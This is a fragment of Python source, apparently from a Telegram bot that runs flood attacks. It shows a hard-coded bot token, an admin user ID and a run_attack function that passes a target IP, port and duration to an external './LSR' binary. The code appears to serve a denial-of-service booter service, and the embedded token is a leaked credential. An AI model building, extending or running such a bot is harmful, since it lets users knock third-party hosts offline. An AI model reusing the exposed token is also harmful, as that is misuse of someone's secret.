...
TELEGRAM_BOT_TOKEN = '7667528026:AAFuAXg6jse1du9-cEoLenffC0us670hMBY'  # Replace with your bot token
ADMIN_USER_ID = 7792814115
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./LSR {ip} {port} {duration} {999}"
